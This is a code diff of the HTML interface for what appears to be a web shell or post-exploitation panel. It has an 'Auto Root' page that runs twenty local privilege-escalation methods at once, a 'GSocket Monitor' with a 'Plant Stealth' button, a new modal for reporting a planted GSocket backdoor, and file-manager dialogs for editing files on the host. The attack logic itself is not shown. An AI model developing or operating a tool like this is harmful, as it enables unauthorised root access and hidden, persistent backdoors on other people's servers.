@@ -44,13 +44,7 @@
 
 <!-- Auto-Root -->
 <div id="p-root" class="page">
-<div class="topbar">
-<div class="topbar-title">Auto <span>Root</span></div>
-<div style="display:flex;gap:8px">
-<button class="btn btn-sm btn-ghost" onclick="initMethodCards()">Reset</button>
-<button class="btn btn-purple" onclick="runAllMethods()" id="btn-autoroot">🚀 Run All</button>
-</div>
-</div>
+<div class="topbar"><div class="topbar-title">Auto <span>Root</span></div><div style="display:flex;gap:8px"><button class="btn btn-sm btn-ghost" onclick="initMethodCards()">Reset</button><button class="btn btn-purple" onclick="runAllMethods()" id="btn-autoroot">🚀 Run All</button></div></div>
 <div class="alert success" style="display:none" id="root-success"><span class="alert-icon">🎉</span><div class="alert-text"><strong>ROOT!</strong><span id="root-success-msg"></span></div></div>
 <div class="card"><div class="card-title">LPE Methods (20)</div><div id="method-list"></div></div>
 <div id="root-result"></div>
@@ -80,7 +74,7 @@
 <div id="p-gs" class="page">
 <div class="topbar"><div class="topbar-title">GSocket <span>Monitor</span></div><div style="display:flex;gap:8px"><button class="btn btn-sm" onclick="gsScan()">🔍 Scan</button><button class="btn btn-sm btn-green" onclick="gsPlant()">🌱 Plant Stealth</button></div></div>
 <div id="gs-alert"></div>
-<div class="card"><div class="card-title">Detected GSockets</div><div id="gs-list"></div></div>
+<div class="card"><div class="card-title">◆ Detected GSockets</div><div id="gs-list"></div></div>
 </div>
 
 <!-- Processes -->
@@ -102,5 +96,9 @@
 <div class="modal" id="modal-view"><div class="modal-box"><div class="modal-head"><h3 id="modal-view-title">View</h3><button onclick="closeModal('modal-view')">×</button></div><div class="modal-body"><div class="preview-box" id="modal-view-content"></div></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-view')">Close</button><button class="btn" onclick="fmEdit()">Edit</button></div></div></div>
 <div class="modal" id="modal-edit"><div class="modal-box"><div class="modal-head"><h3 id="modal-edit-title">Edit</h3><button onclick="closeModal('modal-edit')">×</button></div><div class="modal-body"><textarea id="modal-edit-content"></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-edit')">Cancel</button><button class="btn" onclick="fmSaveEdit()">Save</button></div></div></div>
 <div class="modal" id="modal-new"><div class="modal-box"><div class="modal-head"><h3>New File</h3><button onclick="closeModal('modal-new')">×</button></div><div class="modal-body"><input type="text" id="modal-new-name" placeholder="filename" style="margin-bottom:12px"><textarea id="modal-new-content" placeholder="Content..."></textarea></div><div class="modal-foot"><button class="btn btn-ghost" onclick="closeModal('modal-new')">Cancel</button><button class="btn" onclick="fmSaveNew()">Create</button></div></div></div>
+
+<!-- GS Plant Result Modal -->
+<div class="modal" id="modal-gsplant"><div class="modal-box" style="max-width:500px"><div class="modal-head"><h3>🌱 Plant GSSocket</h3><button onclick="closeModal('modal-gsplant')">×</button></div><div class="modal-body" id="gs-plant-result"></div><div class="modal-foot"><button class="btn" onclick="closeModal('modal-gsplant')">Close</button></div></div></div>
+
 <script src="app.js"></script>
 </body></html>
